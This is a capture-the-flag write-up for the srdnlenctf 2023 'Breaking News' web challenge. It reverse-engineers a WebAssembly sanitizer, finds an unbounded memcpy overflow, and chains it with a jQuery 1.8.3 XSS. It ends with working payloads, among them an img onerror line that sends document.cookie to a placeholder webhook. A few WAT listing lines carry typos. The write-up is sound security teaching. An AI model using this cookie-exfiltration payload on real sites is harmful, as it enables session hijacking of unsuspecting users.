# srdnlenctf 2023

## Breaking News (3 solves)

Breaking News: We are developing a new fantastic CTF world blog. How good (or bad) is this new fantastic WebAss… Site? help us!!

Website: http://breaking-news.challs.srdnlen.it

Authors: @DarkKnight @DieSoi

### Solution

### Analysis
The challenge is about a Breaking News website with a login/register functionality and the possibility to switch between Italian and World news.

There are a couple of things we should notice by looking at the source codes:
  1. **Jquery version 1.8.3** is quite old and, by looking on the internet, is simple to find out that it’s vulnerable to [XSS](https://github.com/advisories/GHSA-2pqj-h3vj-pqgw);
  2. A Web assembly module is loaded whenever the page /news is fully loaded as we can see in the code below (*static/js/script_news.js*).
     
     ```js
     // WebAssembly loading function
      async function loadWebAssembly() {
        imports = {
          env: asmLibraryArg,
          wasi_snapshot_preview1: asmLibraryArg,
        };
      
        const wasmModule = new WebAssembly.Module(
          await fetch("/static/js/wasm.wasm").then((response) =>
            response.arrayBuffer(),
          ),
        );
      
        await WebAssembly.instantiate(wasmModule, imports);
      }
      
      ...
      
      $(document).ready(() => {
        $(".tab-button").click(function () {
          var tabID = $(this).data("tab");
      
          window.location.hash = tabID;
        });
      
        $(window).on("hashchange", function () {
          switchTab();
        });
      
        // Since the event is only triggered when the hash changes, we need to trigger
        // the event now, to handle the hash the page may have loaded with.
        $(window).trigger("hashchange");
      });
     ```
     Whenever the hashchange event is triggered (so, when the anchor part of a URL changes) the function *switchTab()* is called.

      ```js
      async function switchTab() {
        if (window.location.hash != "") {
          loadWebAssembly();
      
          // Shared memory;
          Module.writeAsciiToMemory(
            decodeURIComponent(document.baseURI.split("#")[1]),
            Module._tabID,
          );
        
          var value = Module.ccall("sanitize_value", "string", [], []);
      
          console.log("Return:" + value);
          window.location.hash = value;
      
          // Removed old
          $(".tab").removeClass("u-tab-active");
          $(".tab-button").removeClass("active");
      
          // Update
          var button = $("a[href*='" + value + "']");
          button.addClass("active");
      
          var table = $("div[id*='" + value + "']");
          table.addClass("u-tab-active");
      
          return false;
        }
      }
      ```

      This function changes the tab by modifying the class attributes of the news sections so that only a section (Italian or World) is visualized.
      The particularity is that a function **sanitize_value** is called from the **WASM module** and the value returned by it is then used to set the new hash
      value of the window location.

#### WASM Module

To visualize the .wasm file loaded you can:
  - download the file from browser developer tools and use [wabt](https://github.com/WebAssembly/wabt) utility [wasm2wat](https://webassembly.github.io/wabt/doc/wasm2wat.1.html). In this way you can visualize the wasm code in human format (.wat) -> the command is `wasm2wat wasm.wasm`
  - visualize .wat directly with browser developer tools;

Let's analyse it piece by piece so that we can understand better what's inside:

  1. ```wasm
      (table (;0;) 1 1 funcref)
      (memory (;0;) 256 256)
      (global (;0;) (mut i32) (i32.const 5244176))
      (global (;1;) (mut i32) (i32.const 0))
      (global (;2;) (mut i32) (i32.const 0))
      (global (;3;) i32 (i32.const 1072))
      (export "memory" (memory 0))
      (export "__wasm_call_ctors" (func 1))
      (export "sanitize_value" (func 2))
      (export "tabID" (global 3))
      (export "__indirect_function_table" (table 0))
      (export "__errno_location" (func 28))
      (export "__stdio_exit" (func 26))
      (export "emscripten_stack_init" (func 19))
      (export "emscripten_stack_get_free" (func 20))
      (export "emscripten_stack_get_base" (func 21))
      (export "emscripten_stack_get_end" (func 22))
      (export "stackSave" (func 16))
      (export "stackRestore" (func 17))
      (export "stackAlloc" (func 18))
      (data (;0;) (i32.const 1024) "tab-it\00\00\00\00\00\00\00\00\00\00tab-wr\00\00\00\00tab-it\00\00\00\00"))
      ```

      The wasm module declares different components:
    
      - **table** with id=0 which contains function references;
      - **linear memory** with id=0 with 256 pages. It’s declared so that WASM can manipulate data stored inside it;
      - different **global variables** → some of them are **mutable** (mut keyword) meaning that they can change throughout the execution of the binary, while only     one (id=3) is **immutable** and initialized to a constant value of 1072;
      - data section with id=0 populates the linear memory starting from address 1024.
    
      In addition, the module exports the memory (so that JS can access or manipulate it), the global data (with id=3) with the name tabID, and several functions       among which the one we need to analyse (i.e. **sanitize_value**). 
    
      Remember. Both **tabID** and **sanitize_value** are used in the JS. In particular, tabID is written by JS

      ```js
        Module.writeAsciiToMemory(
          decodeURIComponent(document.baseURI.split("#")[1]),
          Module._tabID,
        );
      ```

      while sanitize_value is called from here:

      ```js
        var value = Module.ccall("sanitize_value", "string", [], []);
      ```

  2. The other interesting piece of code we can see inside wasm is sanitize_value:

     ```wasm
        1. (func (;2;) (type 0) (result i32)
        2.     (local i32 i32 i32 i32 i32 i32 i32 i32 i32)
        3.     global.get 0
        4.     local.set 0
        5.     i32.const 16
        6.     local.set 1
        7.     local.get 0
        8.     local.get 1
        9.     i32.sub
        10.    local.set 2
        11.    local.get 2
        12.    global.set 0
        13.    call 3
        14.    local.set 3
        15.    block  ;; label = @1
        16.      block  ;; label = @2
        17.        local.get 3
        18.        i32.eqz
        19.        br_if 0 (;@2;)
        20.        i32.const 1072
        21.        local.set 4
        22.        local.get 2
        23.        local.get 4
        24.        i32.store offset=12
        25.        br 1 (;@1;)
        26.      end
        27.      i32.const 1024
        28.      local.set 5
        29.      local.get 2
        30.      local.get 5
        31.      i32.store offset=12
        32.    end
        33.    local.get 2
        34.    i32.load offset=12
        35.    local.set 6
        36.    i32.const 16
        37.    local.set 7
        38.    local.get 2
        39.    local.get 7
        40.    i32.add
        41.    local.set 8
        42.    local.get 8
        43.    global.set 0
        44.    local.get 6
        45.    return)
     ```

       The function with id=2 (i.e. **sanitize_value**) doesn’t take any parameter and returns a 32 bit integer. 

      **3 to 12**. It takes the value of the global variable and change it to the value - 16 
      
      → ga = 5244176 - 16 = 5244160;
      
      **13 to 14**. call the function with id=3 that, as we’ll see later, doesn’t take any parameter and returns a 32 bit integer. It’s result is put inside local variable 3 (see local.set 3);
      
      **16 to 32**. block with an **br_if** (line 19) inside. If the function 3’s return value is equal to zero (i32.eqz) branches to the end of the inner block, otherwise it continues.
      
      - inner block → sets the local value with id=4 to 1072; stores the value of local 4 into the offset of 12 bytes from the start of the linear memory; branches to the end of the outer block;
      - outer block → the same as the inner block but the value is set to 1024 at the same offset;
      
      **33 to 45**. sets the local value 6 with the value loaded from offset 12. So the results of the previous computation is returned since the last two instructions are needed to return local 6. 
      
      NB. the local memory is the data (;0;) value from above. So, if the value returned by function 3 is zero the returned value is the poiter to “tab-it”, otherwise the returned value is the global variable since it’s value is 1072.
      
      So, overall the function can be rewritten as:
     
      ```C
        int sanitize_value(){
          int result = function3();
          if(result == 0)
            return "tab-it";
          else
            return global3; // this is the tabID from the JS
        }
      ```

3. Now we need to understand what’s going on inside function3

    ```wasm
      1. (func (;3;) (type 0) (result i32)
      2.     (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i64 i64)
      3.     global.get 0
      4.     local.set 0
      5.     i32.const 240
      6.     local.set 1
      7.     local.get 0
      8.     local.get 1
      9.     i32.sub
      10.    local.set 2
      11.    local.get 2
      12.    global.set 0
      13.    i32.const 208
      14.    local.set 3
      15.    local.get 2
      16.    local.get 3
      17.    i32.add
      18.    local.set 4
      19.    local.get 4
      20.    local.set 5
      21.    i32.const 16
      22.    local.set 6
      23.    local.get 5
      24.    local.get 6
      25.    i32.add
      26.    local.set 7
      27.    i32.const 0
      28.    local.set 8
      29.     ocal.get 8
      30.     i2.load offset=1056
      31.     loal.set 9
      32.     local.get 7
      33.     local.get 9
      34.     i32.store
      35.     i32.const 8
      36.     local.set 10
      37.     local.get 5
      38.     local.get 10
      39.     i32.add
      40.     local.set 11
      41.     local.get 8
      42.     i64.load offset=1048
      43.     local.set 58
      44.     local.get 11
      45.     local.get 58
      46.     i64.store
      47.     local.get 8
      48.     i64.load offset=1040
      49.     local.set 59
      50.     local.get 5
      51.     local.get 59
      52.     i64.store
      53.     i32.const 16
      54.     local.set 12
      55.     local.get 2
      56.     local.get 12
      57.     i32.add
      58.     local.set 13
      59.     local.get 13
      60.     local.set 14
      61.     i32.const 190
      62.     local.set 15
      63.     i32.const 0
      64.     local.set 16
      65.     local.get 14
      66.     local.get 16
      67.     local.get 15
      68.     call 5
      69.     drop
      70.     i32.const 1072
      71.     local.set 17
      72.     local.get 2
      73.     local.get 17
      74.     i32.store offset=12
      75.     i32.const 16
      76.     local.set 18
      77.     local.get 2
      78.     local.get 18
      79.     i32.add
      80.     local.set 19
      81.     local.get 19
      82.     local.set 20
      83.     local.get 2
      84.     i32.load offset=12
      85.     local.set 21
      86.     local.get 2
      87.     i32.load offset=12
      88.     local.set 22
      89.     local.get 22
      90.     call 6
      91.     local.set 23
      92.     local.get 20
      93.     local.get 21
      94.     local.get 23
      95.     call 4
      96.     drop
      97.     i32.const 0
      98.     local.set 24
      99.     local.get 2
      100.     local.get 24
      101.     i32.store8 offset=205
      102.     i32.const 0
      103.     local.set 25
      104.     local.get 2
      105.     local.get 25
      106.     i32.store offset=8
      107.     block  ;; label = @1
      108.       block  ;; label = @2
      109.         loop  ;; label = @3
      110.           local.get 2
      111.           i32.load offset=8
      112.           local.set 26
      113.           i32.const 2
      114.           local.set 27
      115.           local.get 26
      116.           local.set 28
      117.           local.get 27
      118.           local.set 29
      119.           local.get 28
      120.           local.get 29
      121.           i32.lt_s
      122.           local.set 30
      123.           i32.const 1
      124.           local.set 31
      125.           local.get 30
      126.           local.get 31
      127.           i32.and
      128.           local.set 32
      129.           local.get 32
      130.           i32.eqz
      131.           br_if 1 (;@2;)
      132.           i32.const 16
      133.           local.set 33
      134.           local.get 2
      135.           local.get 33
      136.           i32.add
      137.           local.set 34
      138.           local.get 34
      139.           local.set 35
      140.           local.get 2
      141.           i32.load offset=8
      142.           local.set 36
      143.           i32.const 208
      144.           local.set 37
      145.           local.get 2
      146.           local.get 37
      147.           i32.add
      148.           local.set 38
      149.           local.get 38
      150.           local.set 39
      151.           i32.const 10
      152.           local.set 40
      153.           local.get 36
      154.           local.get 40
      155.           i32.mul
      156.           local.set 41
      157.           local.get 39
      158.           local.get 41
      159.           i32.add
      160.           local.set 42
      161.           local.get 35
      162.           local.get 42
      163.           call 11
      164.           local.set 43
      165.           i32.const 0
      166.           local.set 44
      167.           local.get 43
      168.           local.set 45
      169.           local.get 44
      170.           local.set 46
      171.           local.get 45
      172.           local.get 46
      173.           i32.ne
      174.           local.set 47
      175.           i32.const 1
      176.           local.set 48
      177.           local.get 47
      178.           local.get 48
      179.           i32.and
      180.           local.set 49
      181.           block  ;; label = @4
      182.             local.get 49
      183.             i32.eqz
      184.             br_if 0 (;@4;)
      185.             i32.const 1
      186.             local.set 50
      187.             local.get 2
      188.             local.get 50
      189.             i32.store offset=236
      190.             br 3 (;@1;)
      191.           end
      192.           local.get 2
      193.           i32.load offset=8
      194.           local.set 51
      195.           i32.const 1
      196.           local.set 52
      197.           local.get 51
      198.           local.get 52
      199.           i32.add
      200.           local.set 53
      201.           local.get 2
      202.           local.get 53
      203.           i32.store offset=8
      204.           br 0 (;@3;)
      205.         end
      206.         unreachable
      207.       end
      208.       i32.const 0
      209.       local.set 54
      210.       local.get 2
      211.       local.get 54
      212.       i32.store offset=236
      213.     end
      214.     local.get 2
      215.     i32.load offset=236
      216.     local.set 55
      217.     i32.const 240
      218.     local.set 56
      219.     local.get 2
      220.     local.get 56
      221.     i32.add
      222.     local.set 57
      223.     local.get 57
      224.     global.set 0
      225.     local.get 55
      226.     return)
    ```

      - func. 6 should compute a size. That can be inferred from
    
    ```wasm
      89.     local.get 22
      90.     call 6
      91.     local.set 23
      92.     local.get 20
      93.     local.get 21
      94.     local.get 23
      95.     call 4
      96.     drop
    ```
    
    call 6 takes as parameter local 22 (which is probably a buffer), the result is used to set local 23. Eventually, call 4 takes as parameter local 20 (dst),   local 21 (src) and local 23 (size).

    **70 to 96**. Value 1072 is pushed into the stack and then saved inside the linear memory at offset 12 (line 76); some computations are done to set local 20     which is the dst buffer; local 21 is set to be the src buffer (value 1072 since it loads the content from the offset 12 just set); local 23 is then the size       of the tabID.

    To recap, this piece of code can be rewritten as:

    ```C
        char *dst = buffer;      // buffer is a buffer in the local
        char *src = tabID;
        int size = strlen(src);  // strlen since we know that src is a char* as prescribed by memcpy definition;
        memcpy(dst, src, size); 
    ```

    The question is: what is the buffer?

    Previously, we said that probably call 5 is not important to understand the code. Now, by looking forward from line 95 we can actually understand what’s going on inside function 5. The parameters that are passed are a memory location (line 65), the value 0 (line 66) and the value 190 (line 67).
    
    Function 5 after making some computations it performs a loop. The loop is controlled by the third parameter, and the buffer is filled with zeros. NB. That’s quite difficult to understand but we can infere it by looking at ChatGPT analysis, and using [wasm2c utility](https://webassembly.github.io/wabt/doc/wasm2c.1.html).
    
    In the end the buffer can be declared in C-like style:

     ```C
      char buffer[190] = {0};
     ```

     **107 to 213**. Here a loop is used.

    1. The loop index is on offset 8 (**lines 102 to 106**): the i in a C for loop;
    2. The loop condition is i<2 (**lines 113 to 131**). The condition is computed in a particular way → there is the i32.lt_s (less than signed instruction) between i and 2 (lines 113 to 122); the result is ANDed with 1 (**lines 122 to 127**) and if the result of this and is compared with 0 (**line 130**);
    3. Inside the loop there is a call to function 11 to which two parameters are passed (lines 161 to 164). By looking backward we can understand to basics:
        1. local 35 (first param of func 11) is the buffer since from line 132 to 139 there is the same operations to obtain the buffer index to pass to func 5. 
        2. local 42 (second param of func 11) is an element of a kind of list. The reasoning derives from analysing lines 141 to 160.  Indeed, line 142 sets local 36 to i (offset 8). Then, there is an add between 37 and 2; a multiplication between constant 10 and local 36 (lines 153 to 155); then ad add between the results of this two operations is local 42.
        
        The question is: what is the array? Even in this case we can infere it by looking at data section → the last two elements are 10 bytes long and contain tab-wr and tab-it. So, the array used inside the loop is:

       ```C
         char array[2][10] = {"tab-wr", "tab-it"}
       ```
   4. A similar reason to the one done in number 2 is done to check the result of func 11. The only difference is the first condition which checks is the result is one (not equal) to 0 (**lines 165 to 174**):
      
      a. func_11(l_35, l_42) = 0 → l_47 = 0 → l_49 = 0 → continues the loop;
   
      b. func_11(l_35, l_42) = 1 → l_47 = 1 → l_49 = 1 → returns exiting the loop;

   5. In the case the loop continues the index i is added to 1 → i=i+1 (lines 192 to 204);
  
   6. In the case the function exists the loop:
        a. offset 236 becomes 1 (line 185 to 189);
      
        b. the control is transferred to label 1 (end of outer block) (line 190);
      
        c. function returns (line 225-226);

   7. In the case the loop continues till its end (lines 207 to 212) the function will returns 0 since offset 236 becomes 0;
   So, The loop can be rewritten as:
    ```C
      for(int i=0;i<2;i++){
	      if(func_11(l_35, l_42) == 1)
		      return 1;
      }
      return 0;
    ```
4. The last point to understand is func_11. What’s the goal?
    
    Since this function is quite long to understand we can bypass the static analysis of func_11 by doing some trials on the system.
    
      - If we set tabID = ‘tab-wr’ → the page redirects to tab-wr;
      - If we set tabID = ‘tab-it’ → the page redirects to tab-it;
      - If we set tabID = ‘xxxxxxx’ → the page redirects to tab-it;
    
    So, by doing this simple tests we can understand how the func_11 (which is the core of func_3) works → if the buffer contains the word in the array to check (array[i]) the function returns 1, otherwise 0. 
    
    In other words, func_11 is implementing a substring search.
    
    Overall, func_3 can be written as:

    ```C
      char buffer[190] = {0};
      char array[2][10] = {"tab-wr", "tab-it"};
      
      memcpy(buffer, tabID, strlen(tabID);
      for(int i=0;i<2;i++){
        if(sub_string_find(buffer, array[i]) == 1)
          return 1;
      }
      return 0;
    ```

### Exploit

The first thing to notice is that memcpy is vulnerable to buffer overflow because the third parameter is the size of the user input and not the one of the destination buffer. So, we can attack it by adding some other character so that array is filled with our input. In this way we can easily bypass sub_string_found.

  ```python
    tabID = "tab-en" + "a"*184 + "a"*10
  ```

The other vulnerability as said before is XSS in Jquery 1.8.3.

  ```python
    tabID = "<img src=x onerror='alert(1)'/>"
    tabID += 'a'*(190-len(tabID)) + 'a'*10
  ```
  An alert(1) is prompted.

  Eventually, the final exploit is:

  ```python
    tabID = "<img src/onerror=fetch('[YOUR_WEBHOOK]?p='+document.cookie)/>"
    tabID += 'a'*(190-len(tabID)) + 'a'*10
  ```







